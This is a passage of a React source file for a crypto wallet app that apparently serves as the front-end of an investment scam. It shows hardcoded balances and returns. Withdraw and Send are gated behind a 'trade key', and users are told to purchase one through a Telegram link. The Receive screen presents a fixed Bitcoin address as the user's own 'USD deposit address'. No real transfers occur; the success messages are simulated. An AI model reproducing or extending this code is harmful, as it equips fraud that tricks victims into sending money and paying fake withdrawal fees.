import React, { useState, useEffect, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Send, 
  Download, 
  RefreshCw, 
  ArrowUpRight, 
  BarChart3, 
  Bell, 
  TrendingUp, 
  Settings, 
  Home, 
  Wallet, 
  PieChart, 
  User,
  X,
  ChevronRight,
  ArrowUp,
  ArrowDown,
  Search,
  QrCode,
  Copy,
  Plus,
  Trash2,
  CheckCircle2,
  AlertCircle
} from 'lucide-react';

// --- Types ---
type Tab = 'home' | 'wallet' | 'markets' | 'profile';

interface CryptoAsset {
  id: string;
  name: string;
  ticker: string;
  price: number;
  change24h: number;
  color: string;
  sparkline: number[];
}

interface PriceAlert {
  id: string;
  assetId: string;
  targetPrice: number;
  condition: 'above' | 'below';
  active: boolean;
}

// --- Constants ---
const TRADE_KEY = 'PD-50000';

const TRENDING_ASSETS: CryptoAsset[] = [
  { id: 'bitcoin', name: 'Bitcoin', ticker: 'BTC', price: 64230.12, change24h: 2.45, color: 'bg-orange-100 text-orange-600', sparkline: [40, 60, 45, 80, 55, 90, 70, 100, 85, 95] },
  { id: 'ethereum', name: 'Ethereum', ticker: 'ETH', price: 3450.45, change24h: -1.20, color: 'bg-blue-100 text-blue-600', sparkline: [80, 70, 90, 65, 75, 60, 50, 45, 55, 40] },
  { id: 'solana', name: 'Solana', ticker: 'SOL', price: 145.20, change24h: 5.82, color: 'bg-purple-100 text-purple-600', sparkline: [30, 40, 35, 50, 60, 55, 70, 85, 90, 100] },
  { id: 'cardano', name: 'Cardano', ticker: 'ADA', price: 0.45, change24h: 0.50, color: 'bg-blue-50 text-blue-500', sparkline: [50, 55, 52, 58, 54, 60, 58, 62, 60, 65] },
  { id: 'polkadot', name: 'Polkadot', ticker: 'DOT', price: 7.20, change24h: -2.15, color: 'bg-pink-100 text-pink-600', sparkline: [70, 65, 68, 60, 55, 58, 52, 48, 50, 45] },
  { id: 'avalanche', name: 'Avalanche', ticker: 'AVAX', price: 35.80, change24h: 3.40, color: 'bg-red-100 text-red-600', sparkline: [40, 45, 42, 50, 55, 60, 65, 70, 75, 80] },
];

// --- Components ---

const Notification = ({ message, type, onClose }: { message: string, type: 'success' | 'alert', onClose: () => void }) => {
  useEffect(() => {
    const timer = setTimeout(onClose, 6000); // Increased time for reading links
    return () => clearTimeout(timer);
  }, [onClose]);

  const renderMessage = (text: string) => {
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const parts = text.split(urlRegex);
    
    return parts.map((part, i) => {
      if (part.match(urlRegex)) {
        return (
          <a 
            key={i} 
            href={part} 
            target="_blank" 
            rel="noopener noreferrer"
            className="underline decoration-2 underline-offset-2 hover:opacity-80 transition-opacity break-all"
            onClick={(e) => e.stopPropagation()}
          >
            {part}
          </a>
        );
      }
      return part;
    });
  };

  return (
    <motion.div 
      initial={{ opacity: 0, y: -50 }}
      animate={{ opacity: 1, y: 20 }}
      exit={{ opacity: 0, y: -50 }}
      className={`fixed top-0 left-1/2 -translate-x-1/2 z-[100] w-[90%] max-w-sm p-4 rounded-2xl shadow-2xl flex items-center gap-3 ${
        type === 'success' ? 'bg-green-500 text-white' : 'bg-[#e8c94a] text-[#1a1a2e]'
      }`}
    >
      {type === 'success' ? <CheckCircle2 className="w-6 h-6 flex-shrink-0" /> : <AlertCircle className="w-6 h-6 flex-shrink-0" />}
      <p className="font-bold flex-1 text-sm leading-tight">
        {renderMessage(message)}
      </p>
      <button onClick={onClose} className="flex-shrink-0"><X className="w-5 h-5" /></button>
    </motion.div>
  );
};

const WithdrawModal = ({ isOpen, onClose, onNotify }: { isOpen: boolean, onClose: () => void, onNotify: (m: string, t: 'success' | 'alert') => void }) => {
  const [amount, setAmount] = useState('');
  const [tradeKey, setTradeKey] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing'>('idle');

  const handleWithdraw = () => {
    if (!amount || !tradeKey) {
      onNotify('Please fill all fields', 'alert');
      return;
    }
    if (tradeKey !== TRADE_KEY) {
      onNotify('Invalid Key. Contact developer for purchase trade key through the link: https://t.me/Investmentsft', 'alert');
      return;
    }
    
    setStatus('processing');
    setTimeout(() => {
      setStatus('idle');
      onNotify(`Successfully withdrawn $${amount}`, 'success');
      setAmount('');
      setTradeKey('');
      onClose();
    }, 2000);
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={onClose}
            className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50"
          />
          <motion.div 
            initial={{ y: '100%' }}
            animate={{ y: 0 }}
            exit={{ y: '100%' }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed bottom-0 left-0 right-0 bg-white rounded-t-[32px] p-8 z-50 shadow-2xl max-w-md mx-auto"
          >
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-bold">Withdraw Funds</h2>
              <button onClick={onClose} className="p-2 bg-gray-100 rounded-full hover:bg-gray-200 transition-colors">
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>
            
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-bold text-gray-400 mb-2">Amount (USD)</label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-2xl font-bold text-gray-400">$</span>
                  <input 
                    type="number" 
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="0.00"
                    className="w-full pl-10 pr-4 py-4 bg-gray-50 border-2 border-transparent focus:border-[#e8c94a] rounded-2xl outline-none text-2xl font-bold transition-all"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-400 mb-2">Trade Key / Access Key</label>
                <input 
                  type="password" 
                  value={tradeKey}
                  onChange={(e) => setTradeKey(e.target.value)}
                  placeholder="Enter access key"
                  className="w-full px-5 py-4 bg-gray-50 border-2 border-transparent focus:border-[#e8c94a] rounded-2xl outline-none font-bold transition-all"
                />
                <p className="text-[10px] text-gray-400 mt-2 font-bold uppercase tracking-wider">Permanent developer trade key required</p>
              </div>

              <div className="flex gap-4">
                <button 
                  onClick={onClose}
                  className="flex-1 py-4 bg-gray-100 text-gray-600 rounded-2xl font-bold active:scale-95 transition-all"
                >
                  Cancel
                </button>
                <button 
                  onClick={handleWithdraw}
                  disabled={status === 'processing'}
                  className="flex-1 py-4 bg-[#1a1a2e] text-white rounded-2xl font-bold active:scale-95 transition-all shadow-lg shadow-[#1a1a2e]/20 disabled:opacity-50"
                >
                  {status === 'processing' ? 'Processing...' : 'Confirm'}
                </button>
              </div>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

const SwapModal = ({ isOpen, onClose, onNotify }: { isOpen: boolean, onClose: () => void, onNotify: (m: string, t: 'success' | 'alert') => void }) => {
  const [btcAmount, setBtcAmount] = useState('');
  const [usdAmount, setUsdAmount] = useState('');
  const btcPrice = 64230.12;

  const handleBtcChange = (val: string) => {
    setBtcAmount(val);
    if (val) {
      setUsdAmount((parseFloat(val) * btcPrice).toFixed(2));
    } else {
      setUsdAmount('');
    }
  };

  const handleUsdChange = (val: string) => {
    setUsdAmount(val);
    if (val) {
      setBtcAmount((parseFloat(val) / btcPrice).toFixed(8));
    } else {
      setBtcAmount('');
    }
  };

  const handleSwap = () => {
    if (!btcAmount) return;
    onNotify(`Successfully swapped ${btcAmount} BTC for $${usdAmount}`, 'success');
    setBtcAmount('');
    setUsdAmount('');
    onClose();
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={onClose} className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50" />
          <motion.div initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }} className="fixed bottom-0 left-0 right-0 bg-white rounded-t-[32px] p-8 z-50 shadow-2xl max-w-md mx-auto">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-bold">Deposit / Convert</h2>
              <button onClick={onClose} className="p-2 bg-gray-100 rounded-full hover:bg-gray-200 transition-colors">
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>
            
            <div className="space-y-6">
              <div className="bg-gray-50 p-6 rounded-[28px] border border-gray-100">
                <div className="flex justify-between mb-2">
                  <span className="text-xs font-bold text-gray-400 uppercase">From (Crypto)</span>
                  <span className="text-xs font-bold text-gray-400 uppercase">Balance: 0.08 BTC</span>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center font-bold">B</div>
                  <input 
                    type="number" 
                    value={btcAmount}
                    onChange={(e) => handleBtcChange(e.target.value)}
                    placeholder="0.00"
                    className="flex-1 bg-transparent text-2xl font-bold outline-none"
                  />
                  <span className="font-bold text-gray-400">BTC</span>
                </div>
              </div>

              <div className="flex justify-center -my-4 relative z-10">
                <div className="bg-white p-2 rounded-full shadow-md border border-gray-100">
                  <ArrowDown className="w-6 h-6 text-[#e8c94a]" />
                </div>
              </div>

              <div className="bg-gray-50 p-6 rounded-[28px] border border-gray-100">
                <div className="flex justify-between mb-2">
                  <span className="text-xs font-bold text-gray-400 uppercase">To (USD Balance)</span>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-green-100 text-green-600 rounded-full flex items-center justify-center font-bold">$</div>
                  <input 
                    type="number" 
                    value={usdAmount}
                    onChange={(e) => handleUsdChange(e.target.value)}
                    placeholder="0.00"
                    className="flex-1 bg-transparent text-2xl font-bold outline-none"
                  />
                  <span className="font-bold text-gray-400">USD</span>
                </div>
              </div>

              <div className="p-4 bg-gray-50 rounded-2xl border border-gray-100">
                <div className="flex justify-between text-xs font-bold">
                  <span className="text-gray-400">Exchange Rate</span>
                  <span className="text-[#1a1a2e]">1 BTC = ${btcPrice.toLocaleString()}</span>
                </div>
              </div>

              <button onClick={handleSwap} className="w-full py-4 bg-[#1a1a2e] text-white rounded-2xl font-bold shadow-lg shadow-[#1a1a2e]/20 active:scale-95 transition-all">
                Deposit Now
              </button>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

const SendModal = ({ isOpen, onClose, onNotify }: { isOpen: boolean, onClose: () => void, onNotify: (m: string, t: 'success' | 'alert') => void }) => {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [tradeKey, setTradeKey] = useState('');

  const handleSend = () => {
    if (!address || !amount || !tradeKey) {
      onNotify('Please fill all fields', 'alert');
      return;
    }
    if (tradeKey !== TRADE_KEY) {
      onNotify('Invalid Key. Contact developer for purchase trade key through the link: https://t.me/Investmentsft', 'alert');
      return;
    }
    onNotify(`Sent $${amount} USD to ${address.substring(0, 8)}...`, 'success');
    setAddress('');
    setAmount('');
    setTradeKey('');
    onClose();
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={onClose} className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50" />
          <motion.div initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }} className="fixed bottom-0 left-0 right-0 bg-white rounded-t-[32px] p-8 z-50 shadow-2xl max-w-md mx-auto">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-bold">Send USD</h2>
              <button onClick={onClose} className="p-2 bg-gray-100 rounded-full hover:bg-gray-200 transition-colors">
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>
            <div className="space-y-6">
              <div className="bg-gray-50 p-4 rounded-2xl border border-gray-100 flex items-center justify-between">
                <span className="text-sm font-bold text-gray-400 uppercase">Currency</span>
                <span className="font-bold text-[#1a1a2e]">United States Dollar (USD)</span>
              </div>
              <div>
                <label className="block text-sm font-bold text-gray-400 mb-2">Recipient Address / ID</label>
                <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} placeholder="Enter recipient wallet or ID" className="w-full px-5 py-4 bg-gray-50 rounded-2xl font-bold outline-none border-2 border-transparent focus:border-[#e8c94a]" />
              </div>
              <div>
                <label className="block text-sm font-bold text-gray-400 mb-2">Amount (USD)</label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xl font-bold text-gray-400">$</span>
                  <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="w-full pl-10 pr-4 py-4 bg-gray-50 rounded-2xl font-bold outline-none border-2 border-transparent focus:border-[#e8c94a]" />
                </div>
              </div>
              <div>
                <label className="block text-sm font-bold text-gray-400 mb-2">Trade Key / Access Key</label>
                <input 
                  type="password" 
                  value={tradeKey}
                  onChange={(e) => setTradeKey(e.target.value)}
                  placeholder="Enter access key"
                  className="w-full px-5 py-4 bg-gray-50 border-2 border-transparent focus:border-[#e8c94a] rounded-2xl outline-none font-bold transition-all"
                />
                <p className="text-[10px] text-gray-400 mt-2 font-bold uppercase tracking-wider">Permanent developer trade key required</p>
              </div>
              <button onClick={handleSend} className="w-full py-4 bg-[#1a1a2e] text-white rounded-2xl font-bold shadow-lg active:scale-95 transition-all">Send Funds</button>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

const ReceiveModal = ({ isOpen, onClose, onNotify }: { isOpen: boolean, onClose: () => void, onNotify: (m: string, t: 'success' | 'alert') => void }) => {
  const address = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';

  const copyAddress = () => {
    navigator.clipboard.writeText(address);
    onNotify('USD Deposit Address copied', 'success');
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={onClose} className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50" />
          <motion.div initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }} className="fixed bottom-0 left-0 right-0 bg-white rounded-t-[32px] p-8 z-50 shadow-2xl max-w-md mx-auto">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-bold">Receive USD</h2>
              <button onClick={onClose} className="p-2 bg-gray-100 rounded-full hover:bg-gray-200 transition-colors">
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>
            <div className="space-y-8 flex flex-col items-center">
              <div className="w-full bg-gray-50 p-4 rounded-2xl border border-gray-100 flex items-center justify-between">
                <span className="text-sm font-bold text-gray-400 uppercase">Currency</span>
                <span className="font-bold text-[#1a1a2e]">USD (Digital)</span>
              </div>
              
              <div className="p-6 bg-gray-50 rounded-[32px] border-2 border-dashed border-gray-200">
                <QrCode className="w-48 h-48 text-[#1a1a2e]" />
              </div>

              <div className="w-full">
                <label className="block text-xs font-bold text-gray-400 mb-2 uppercase tracking-widest text-center">Your USD Deposit Address</label>
                <div className="flex items-center gap-2 bg-gray-50 p-4 rounded-2xl border border-gray-100">
                  <p className="text-xs font-bold text-[#1a1a2e] flex-1 break-all">{address}</p>
                  <button onClick={copyAddress} className="p-2 bg-white rounded-xl shadow-sm active:scale-90 transition-all">
                    <Copy className="w-5 h-5 text-[#e8c94a]" />
                  </button>
                </div>
              </div>
              
              <p className="text-xs text-center text-gray-400 font-medium">Only send USD-pegged assets (USDT/USDC) to this address. Sending other assets may result in permanent loss.</p>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

const AlertsModal = ({ isOpen, onClose, onNotify }: { isOpen: boolean, onClose: () => void, onNotify: (m: string, t: 'success' | 'alert') => void }) => {
  const [alerts, setAlerts] = useState<PriceAlert[]>(() => {
    const saved = localStorage.getItem('zimap_alerts');
    return saved ? JSON.parse(saved) : [];
  });
  const [assetId, setAssetId] = useState('bitcoin');
  const [price, setPrice] = useState('');
  const [condition, setCondition] = useState<'above' | 'below'>('above');

  useEffect(() => {
    localStorage.setItem('zimap_alerts', JSON.stringify(alerts));
  }, [alerts]);

  const addAlert = () => {
    if (!price) return;
    const newAlert: PriceAlert = {
      id: Math.random().toString(36).substr(2, 9),
      assetId,
      targetPrice: parseFloat(price),
      condition,
      active: true
    };
    setAlerts([...alerts, newAlert]);
    setPrice('');
    onNotify('Price alert set successfully', 'success');
  };

  const removeAlert = (id: string) => {
    setAlerts(alerts.filter(a => a.id !== id));
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={onClose} className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50" />
          <motion.div initial={{ y: '100%' }} animate={{ y: 0 }} exit={{ y: '100%' }} className="fixed bottom-0 left-0 right-0 bg-white rounded-t-[32px] p-8 z-50 shadow-2xl max-w-md mx-auto max-h-[80vh] overflow-y-auto no-scrollbar">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-bold">Price Alerts</h2>
              <button onClick={onClose} className="p-2 bg-gray-100 rounded-full hover:bg-gray-200 transition-colors">
                <X className="w-5 h-5 text-gray-500" />
              </button>
            </div>
            
            <div className="space-y-6 mb-8 bg-gray-50 p-6 rounded-[28px]">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold text-gray-400 mb-2 uppercase">Asset</label>
                  <select value={assetId} onChange={(e) => setAssetId(e.target.value)} className="w-full p-3 bg-white rounded-xl font-bold outline-none border border-gray-100">
                    {TRENDING_ASSETS.map(a => <option key={a.id} value={a.id}>{a.name}</option>)}
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-gray-400 mb-2 uppercase">Condition</label>
                  <select value={condition} onChange={(e) => setCondition(e.target.value as any)} className="w-full p-3 bg-white rounded-xl font-bold outline-none border border-gray-100">
                    <option value="above">Goes Above</option>
                    <option value="below">Goes Below</option>
                  </select>
                </div>
              </div>
              <div>
                <label className="block text-xs font-bold text-gray-400 mb-2 uppercase">Target Price (USD)</label>
                <input type="number" value={price} onChange={(e) => setPrice(e.target.value)} placeholder="0.00" className="w-full p-3 bg-white rounded-xl font-bold outline-none border border-gray-100" />
              </div>
              <button onClick={addAlert} className="w-full py-4 bg-[#e8c94a] text-[#1a1a2e] rounded-2xl font-bold flex items-center justify-center gap-2">
                <Plus className="w-5 h-5" /> Set Alert
              </button>
            </div>

            <div className="space-y-3">
              <h3 className="font-bold text-sm text-gray-400 uppercase tracking-widest px-2">Active Alerts</h3>
              {alerts.length === 0 ? (
                <p className="text-center py-8 text-gray-400 font-medium">No active alerts</p>
              ) : (
                alerts.map(alert => {
                  const asset = TRENDING_ASSETS.find(a => a.id === alert.assetId);
                  return (
                    <div key={alert.id} className="bg-white p-4 rounded-2xl flex items-center justify-between border border-gray-100 shadow-sm">
                      <div>
                        <p className="font-bold text-[#1a1a2e]">{asset?.name} {alert.condition === 'above' ? '▲' : '▼'}</p>
                        <p className="text-xs text-gray-400 font-bold">${alert.targetPrice.toLocaleString()}</p>
                      </div>
                      <button onClick={() => removeAlert(alert.id)} className="p-2 text-red-500 hover:bg-red-50 rounded-xl transition-all">
                        <Trash2 className="w-5 h-5" />
                      </button>
                    </div>
                  );
                })
              )}
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

const HomeTab = ({ username, onAction }: { username: string, onAction: (a: string) => void }) => {
  return (
    <div className="space-y-8 pb-24">
      {/* Hero Section */}
      <section className="relative bg-[#1a1a2e] rounded-[32px] p-8 text-white overflow-hidden shadow-2xl shadow-[#1a1a2e]/30">
        <div className="absolute top-[-20%] right-[-10%] w-48 h-48 bg-white/5 rounded-full" />
        <div className="absolute bottom-[-10%] left-[-5%] w-32 h-32 bg-[#e8c94a]/10 rounded-full" />
        
        <div className="flex justify-between items-start mb-8">
          <div>
            <p className="text-gray-400 text-sm font-medium">Good morning,</p>
            <h2 className="text-xl font-bold">{username}</h2>
          </div>
          <div className="w-12 h-12 bg-gradient-to-br from-[#e8c94a] to-[#d4b832] rounded-full flex items-center justify-center font-bold text-[#1a1a2e] shadow-lg shadow-[#e8c94a]/20">
            {username.charAt(0).toUpperCase()}
          </div>
        </div>

        <div className="mb-8">
          <p className="text-gray-400 text-sm font-medium mb-1">Total Portfolio Value</p>
          <div className="flex items-end gap-3">
            <h1 className="text-4xl font-bold">$5,000.00</h1>
            <div className="bg-green-500/20 text-green-400 px-2 py-1 rounded-lg text-xs font-bold flex items-center gap-1 mb-1.5">
              <ArrowUp className="w-3 h-3" /> +$0.00
            </div>
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div className="bg-white/5 backdrop-blur-md p-3 rounded-2xl border border-white/10">
            <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider mb-1">Invested</p>
            <p className="text-sm font-bold">$4,720</p>
          </div>
          <div className="bg-white/5 backdrop-blur-md p-3 rounded-2xl border border-white/10">
            <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider mb-1">Returns</p>
            <p className="text-sm font-bold text-[#e8c94a]">+$280</p>
          </div>
          <div className="bg-white/5 backdrop-blur-md p-3 rounded-2xl border border-white/10">
            <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider mb-1">ROI</p>
            <p className="text-sm font-bold">5.93%</p>
          </div>
        </div>
      </section>

      {/* Quick Actions */}
      <section>
        <div className="flex justify-between items-center mb-4 px-2">
          <h3 className="font-bold text-lg">Quick Actions</h3>
          <button className="text-[#e8c94a] text-sm font-bold">View All</button>
        </div>
        <div className="grid grid-cols-4 gap-y-6">
          {[
            { id: 'send', icon: <Send className="w-6 h-6" />, label: 'Send' },
            { id: 'receive', icon: <Download className="w-6 h-6" />, label: 'Receive' },
            { id: 'deposit', icon: <Plus className="w-6 h-6" />, label: 'Deposit' },
            { id: 'withdraw', icon: <ArrowUpRight className="w-6 h-6" />, label: 'Withdraw' },
            { id: 'markets', icon: <BarChart3 className="w-6 h-6" />, label: 'Markets' },
            { id: 'alerts', icon: <Bell className="w-6 h-6" />, label: 'Alerts' },
            { id: 'earn', icon: <TrendingUp className="w-6 h-6" />, label: 'Earn' },
            { id: 'more', icon: <Settings className="w-6 h-6" />, label: 'More' },
          ].map((action, i) => (
            <div key={i} className="flex flex-col items-center gap-2">
              <button 
                onClick={() => onAction(action.id)}
                className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-sm active:scale-90 transition-all text-[#1a1a2e] hover:bg-[#e8c94a]/10"
              >
                {action.icon}
              </button>
              <span className="text-[11px] font-bold text-gray-500">{action.label}</span>
            </div>
          ))}
        </div>
      </section>

      {/* Portfolio Chart */}
      <section className="bg-white rounded-[28px] p-6 shadow-sm border border-black/5">
        <div className="flex justify-between items-start mb-6">
          <div>
            <h3 className="font-bold">Portfolio</h3>
            <p className="text-xs text-gray-400 font-medium">Bitcoin (BTC/USD)</p>
          </div>
          <div className="text-right">
            <p className="font-bold">$64,230.12</p>
            <p className="text-[10px] text-green-500 font-bold">+2.45%</p>
          </div>
        </div>
        
        <div className="h-32 flex items-end justify-between gap-1 mb-4">
          {[40, 60, 45, 80, 55, 90, 70, 100, 85, 95].map((h, i) => (
            <motion.div 
              key={i}
              initial={{ height: 0 }}
              animate={{ height: `${h}%` }}
              transition={{ delay: i * 0.05 }}
              className={`w-full rounded-t-lg ${i === 7 ? 'bg-[#e8c94a]' : 'bg-gray-100'}`}
            />
          ))}
        </div>

        <div className="flex justify-center gap-4">
          <div className="flex items-center gap-1.5">
            <div className="w-2 h-2 rounded-full bg-[#e8c94a]" />
            <span className="text-[10px] font-bold text-gray-400">BTC</span>
          </div>
          <div className="flex items-center gap-1.5">
            <div className="w-2 h-2 rounded-full bg-[#1a1a2e]" />
            <span className="text-[10px] font-bold text-gray-400">ETH</span>
          </div>
          <div className="flex items-center gap-1.5">
            <div className="w-2 h-2 rounded-full bg-gray-200" />
            <span className="text-[10px] font-bold text-gray-400">SOL</span>
          </div>
        </div>
      </section>

      {/* Assets List */}
      <section>
        <h3 className="font-bold text-lg mb-4 px-2">USD Assets</h3>
        <div className="space-y-3">
          {[
            { name: 'Tether', ticker: 'USDT', price: 1.00, change24h: 0.01, color: 'bg-green-100 text-green-600' },
            { name: 'USD Coin', ticker: 'USDC', price: 1.00, change24h: 0.00, color: 'bg-blue-100 text-blue-600' },
            { name: 'Dai', ticker: 'DAI', price: 1.00, change24h: -0.01, color: 'bg-yellow-100 text-yellow-600' },
          ].map((asset, i) => (
            <div key={i} className="bg-white p-4 rounded-2xl flex items-center justify-between shadow-sm border border-black/5 active:scale-[0.98] transition-all">
              <div className="flex items-center gap-4">
                <div className={`w-12 h-12 rounded-full flex items-center justify-center font-bold ${asset.color}`}>
                  {asset.ticker.charAt(0)}
                </div>
                <div>
                  <p className="font-bold text-[#1a1a2e]">{asset.name}</p>
                  <p className="text-xs text-gray-400 font-bold">{asset.ticker}</p>
                </div>
              </div>
              <div className="text-right">
                <p className="font-bold">${asset.price.toFixed(2)}</p>
                <p className={`text-xs font-bold ${asset.change24h >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                  {asset.change24h >= 0 ? '+' : ''}{asset.change24h}%
                </p>
              </div>
            </div>
          ))}
        </div>
      </section>
    </div>
  );
};

const WalletTab = ({ onAction }: { onAction: (a: string) => void }) => {
  return (
    <div className="space-y-6 pb-24">
      <h2 className="text-2xl font-bold px-2">My Wallet</h2>
      
      <div className="bg-gradient-to-br from-[#1a1a2e] to-[#16213e] rounded-[32px] p-8 text-white shadow-xl">
        <p className="text-gray-400 text-sm font-medium mb-1">Available Balance</p>
        <h1 className="text-4xl font-bold mb-8">$12,450.80</h1>
        
        <div className="flex gap-4">
          <button 
            onClick={() => onAction('receive')}
            className="flex-1 py-4 bg-white/10 backdrop-blur-md rounded-2xl font-bold flex items-center justify-center gap-2 active:scale-95 transition-all"
          >
            <Download className="w-5 h-5" /> Receive
          </button>
          <button 
            onClick={() => onAction('send')}
            className="flex-1 py-4 bg-[#e8c94a] text-[#1a1a2e] rounded-2xl font-bold flex items-center justify-center gap-2 active:scale-95 transition-all shadow-lg shadow-[#e8c94a]/20"
          >
            <Send className="w-5 h-5" /> Send
          </button>
        </div>
      </div>

      <div className="space-y-4">
        <h3 className="font-bold text-lg px-2">Recent Transactions</h3>
        {[
          { type: 'Received', asset: 'USD', amount: '+$1,200.00', date: 'Oct 24, 2023', icon: <Download className="w-5 h-5" />, color: 'text-green-500 bg-green-50' },
          { type: 'Sent', asset: 'USD', amount: '-$450.00', date: 'Oct 22, 2023', icon: <Send className="w-5 h-5" />, color: 'text-red-500 bg-red-50' },
          { type: 'Withdrawn', asset: 'USD', amount: '-$2,000.00', date: 'Oct 20, 2023', icon: <ArrowUpRight className="w-5 h-5" />, color: 'text-blue-500 bg-blue-50' },
        ].map((tx, i) => (
          <div key={i} className="bg-white p-4 rounded-2xl flex items-center justify-between shadow-sm border border-black/5">
            <div className="flex items-center gap-4">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${tx.color}`}>
                {tx.icon}
              </div>
              <div>
                <p className="font-bold text-[#1a1a2e]">{tx.type}</p>
                <p className="text-xs text-gray-400 font-bold">{tx.date}</p>
              </div>
            </div>
            <p className={`font-bold ${tx.amount.startsWith('+') ? 'text-green-500' : 'text-red-500'}`}>
              {tx.amount}
            </p>
          </div>
        ))}
      </div>
    </div>
  );
};

const MarketsTab = () => {
  const [search, setSearch] = useState('');
  
  const filteredAssets = TRENDING_ASSETS.filter(a => 
    a.name.toLowerCase().includes(search.toLowerCase()) || 
    a.ticker.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-6 pb-24">
      <h2 className="text-2xl font-bold px-2">Markets</h2>
      
      <div className="relative px-2">
        <Search className="absolute left-6 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
        <input 
          type="text" 
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search assets..."
          className="w-full pl-12 pr-4 py-4 bg-white rounded-2xl font-bold outline-none border border-black/5 shadow-sm"
        />
      </div>

      <div className="space-y-3">
        {filteredAssets.map((asset, i) => (
          <div key={i} className="bg-white p-4 rounded-2xl flex items-center justify-between shadow-sm border border-black/5">
            <div className="flex items-center gap-4 flex-1">
              <div className={`w-12 h-12 rounded-full flex items-center justify-center font-bold ${asset.color}`}>
                {asset.ticker.charAt(0)}
              </div>
              <div>
                <p className="font-bold text-[#1a1a2e]">{asset.name}</p>
                <p className="text-xs text-gray-400 font-bold">{asset.ticker}</p>
              </div>
            </div>
            
            <div className="w-16 h-8 flex items-end gap-0.5 mx-4">
              {asset.sparkline.map((h, j) => (
                <div key={j} className={`w-1 rounded-t-sm ${asset.change24h > 0 ? 'bg-green-200' : 'bg-red-200'}`} style={{ height: `${h/2}%` }} />
              ))}
            </div>

            <div className="text-right">
              <p className="font-bold">${asset.price.toLocaleString()}</p>
              <p className={`text-xs font-bold ${asset.change24h > 0 ? 'text-green-500' : 'text-red-500'}`}>
                {asset.change24h > 0 ? '+' : ''}{asset.change24h}%
              </p>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

const ProfileTab = ({ username, onSignOut }: { username: string, onSignOut: () => void }) => {
  return (
    <div className="space-y-8 pb-24">
      <div className="text-center pt-4">
        <div className="relative inline-block">
          <div className="w-24 h-24 bg-gradient-to-br from-[#e8c94a] to-[#d4b832] rounded-full flex items-center justify-center text-4xl font-bold text-[#1a1a2e] shadow-xl mx-auto mb-4">
            {username.charAt(0).toUpperCase()}
          </div>
          <div className="absolute bottom-4 right-0 w-6 h-6 bg-green-500 border-4 border-[#f0f0e8] rounded-full" />
        </div>
        <h2 className="text-2xl font-bold">{username}</h2>
        <p className="text-gray-400 font-medium">Verified Account</p>
      </div>

      <div className="space-y-4">
        {[
          { label: 'Email', value: 'director@zimap.io' },
          { label: 'Phone', value: '+1 (555) 000-1234' },
          { label: 'Country', value: 'United States' },
